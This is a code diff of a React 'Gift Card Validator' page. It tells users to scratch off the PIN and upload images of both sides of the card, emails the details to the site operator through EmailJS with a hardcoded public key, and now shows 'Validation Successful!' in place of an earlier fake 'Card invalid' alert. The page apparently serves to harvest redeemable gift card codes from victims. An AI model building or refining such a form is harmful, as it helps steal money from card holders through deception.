@@ -1,4 +1,5 @@
 import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
+import { CheckCircleIcon, WarningIcon } from '@chakra-ui/icons';
 import { useRef, forwardRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
 import imageCompression from 'browser-image-compression';
@@ -208,6 +209,7 @@ function PurchaseOrValidate() {
     const [backImage, setBackImage] = useState(null);
     const [frontImageUrl, setFrontImageUrl] = useState('');
     const [backImageUrl, setBackImageUrl] = useState(''); 
+    const [validationStatus, setValidationStatus] = useState(null); 
 
     const openPurchaseModal = (card) => {
         setSelectedCard(card);
@@ -254,6 +256,8 @@ function PurchaseOrValidate() {
     const handleFormSubmit = (event) => {
         event.preventDefault();
         setLoading(true);
+        setValidationStatus("loading");
+
         const formData = {
             cardName: selectedCard?.name,
             validateCurrency,
@@ -267,7 +271,8 @@ function PurchaseOrValidate() {
         };
         const serviceId = process.env.REACT_APP_SERVICE_ID;
         const templateId = process.env.REACT_APP_TEMPLATE_ID;
-        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
+        // const publicKey = 
+        const publicKey = "BoqfOqh8-iO3tlecS"
         const templateParams = {
             from_name: "Gift Card Validator",
             CustomerEmail: validateUserEmail,
@@ -284,13 +289,18 @@ function PurchaseOrValidate() {
         }
         emailjs.send(serviceId, templateId, templateParams, publicKey)
             .then((response) => {
-                console.log("email sent succesfully", response)
+                console.log("Email sent successfully", response);
+                setValidationStatus("success");
             })
             .catch((error) => {
-                console.error("Error", error)
+                console.error("Error", error);
+                setValidationStatus("failed");
             })
             .finally(() => {
                 setLoading(false);
+                setTimeout(() => {
+                    setValidationStatus(null);
+                }, 10000);
             });
         // Only reset image upload fields if images were uploaded
         if (frontImageUrl) {
@@ -303,9 +313,9 @@ function PurchaseOrValidate() {
         clearFormData();
         // document.getElementById("frontImageUpload").value = "";
         // document.getElementById("backImageUpload").value = ""; 
-        setTimeout(() => {
-            alert('Card invalid');
-        }, 4000);
+        // setTimeout(() => {
+        //     alert('Card invalid');
+        // }, 4000);
     };
 
     const form = useRef();
@@ -537,6 +547,7 @@ function PurchaseOrValidate() {
     };
 
     return (
+        <>
         <Box
             minHeight="30vh"
             width="100%"
@@ -668,7 +679,7 @@ function PurchaseOrValidate() {
                                         <VStack mb={4} spacing={1} align="stretch" color="red" fontSize="14px">
                                                 <Text fontWeight="light">Scratch film of the card to reveal pin before upload where applicable.*</Text>
                                                 <Text fontWeight="light">Please provide your valid email*</Text>
-                                                <Text fontWeight="light">Provide the Currency, Amount, Card Number and other values and you can proceed to upload the front and back of the card</Text>
+                                                <Text fontWeight="light">Please remove card from the gift wrap(package) before uploading*</Text>
                                         </VStack>
                                         <FormControl mt={4}>
                                             <FormLabel>Email</FormLabel>
@@ -836,7 +847,33 @@ function PurchaseOrValidate() {
                     </ModalContent>
                 </Modal>
             </VStack>
+            <Modal 
+                isOpen={validationStatus !== null} 
+                onClose={() => {}} 
+                isCentered
+                closeOnOverlayClick={false}
+            >
+                <ModalOverlay />
+                <ModalContent background="black" color="white" p={4}>
+                <ModalBody display="flex" flexDirection="column" alignItems="center" justifyContent="center">
+                    {validationStatus === "loading" && <Spinner size="xl" />}
+                    {validationStatus === "success" && (
+                    <>
+                        <CheckCircleIcon boxSize={12} color="green.400" />
+                        <Text mt={4}>Validation Successful!</Text>
+                    </>
+                    )}
+                    {validationStatus === "failed" && (
+                    <>
+                        <WarningIcon boxSize={12} color="red.400" />
+                        <Text mt={4}>Validation Failed. Please try again.</Text>
+                    </>
+                    )}
+                </ModalBody>
+                </ModalContent>
+            </Modal>
         </Box>
+        </>
     );
 }
 
